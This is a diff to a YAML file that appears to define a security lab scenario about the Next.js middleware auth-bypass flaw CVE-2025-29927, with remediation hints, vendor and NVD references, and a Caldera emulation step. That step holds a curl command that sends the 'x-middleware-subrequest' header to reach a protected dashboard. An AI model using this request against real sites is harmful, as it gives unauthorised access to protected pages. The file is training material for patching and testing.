@@ -28,9 +28,6 @@ hints:
   - "Check the Next.js version installed in the portal application"
   - "Look up CVE-2025-29927 — it affects Next.js middleware authentication"
   - "Update the 'next' version in /opt/portal/package.json to 14.2.25 or later, run npm install, rebuild with next build, and restart the portal service"
-references:
-  - https://nextjs.org/blog/cve-2025-29927
-  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
 caldera:
   tactic: initial-access
   technique:
@@ -45,3 +42,9 @@ caldera:
     command: |
       curl -s -H "x-middleware-subrequest: middleware" http://localhost:3001/dashboard | grep -i "employee\|dashboard\|welcome" | head -5
       echo "Auth bypass attempted — check response for protected content"
+
+references:
+  - title: "Vendor advisory — Middleware Auth Bypass (CVE-2025-29927)"
+    url: https://nextjs.org/blog/cve-2025-29927
+  - title: "NVD — Middleware Auth Bypass (CVE-2025-29927)"
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
